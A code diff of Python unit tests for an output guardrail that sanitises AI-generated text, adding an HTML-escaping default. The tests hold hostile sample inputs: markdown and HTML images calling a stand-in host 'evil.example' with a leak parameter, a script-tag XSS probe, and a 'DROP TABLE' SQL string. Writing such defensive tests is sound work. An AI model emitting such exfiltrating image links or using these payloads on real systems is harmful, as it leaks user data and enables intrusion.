@@ -43,26 +43,33 @@ class TestPromptGuardrail(unittest.TestCase):
 
 
 class TestOutputGuardrail(unittest.TestCase):
-    def test_blocks_external_image(self):
+    def test_default_is_escape_safe(self):
+        # Default (escape_html=True): output is HTML-escaped, so it is XSS-safe.
         out = OutputGuardrail()
+        r = out.sanitize("<script>alert(1)</script>")
+        self.assertNotIn("<script>", r.sanitized_text)
+        self.assertIn("&lt;script&gt;", r.sanitized_text)
+
+    def test_blocks_external_image(self):
+        out = OutputGuardrail(escape_html=False)
         r = out.sanitize("![x](https://evil.example/leak?d=1)")
         self.assertFalse(r.passed)
         self.assertIn("image removed", r.sanitized_text)
 
     def test_allows_allowlisted_domain(self):
-        out = OutputGuardrail(allowed_url_domains=["internal.example"])
+        out = OutputGuardrail(escape_html=False, allowed_url_domains=["internal.example"])
         r = out.sanitize("![x](https://cdn.internal.example/logo.png)")
         self.assertTrue(r.passed)
 
     def test_blocks_html_image(self):
-        out = OutputGuardrail()
+        out = OutputGuardrail(escape_html=False)
         r = out.sanitize('<img src="https://evil.example/p.gif">')
         self.assertFalse(r.passed)
 
     def test_sql_flag_optional(self):
-        out = OutputGuardrail(block_sql_in_output=True)
+        out = OutputGuardrail(escape_html=False, block_sql_in_output=True)
         self.assertFalse(out.sanitize("then DROP TABLE users;").passed)
-        out2 = OutputGuardrail(block_sql_in_output=False)
+        out2 = OutputGuardrail(escape_html=False, block_sql_in_output=False)
         self.assertTrue(out2.sanitize("then DROP TABLE users;").passed)
 
 
